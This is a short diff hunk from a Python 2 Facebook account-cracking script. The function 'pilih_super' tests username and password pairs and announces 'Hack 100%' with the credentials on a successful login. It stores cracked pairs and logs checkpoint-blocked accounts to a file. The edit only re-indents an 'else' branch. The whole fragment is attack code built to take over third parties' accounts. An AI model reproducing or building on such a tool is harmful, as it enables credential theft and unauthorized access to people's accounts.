@@ -321,7 +321,7 @@ def pilih_super():
 			if 'access_token' in q:
 				print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass1
 				oks.append(user+pass1)
-				else:
+			else:
                         if 'www.facebook.com' in q["error_msg"]:
 					print '\x1b[1;94mCheckpoint\x1b[1;97m-\x1b[1;91m▬\x1b[1;97m-' + user + '-\x1b[1;91m▬\x1b[1;97m-' + pass1
 					cek = open("out/checkpoint.txt", "a")
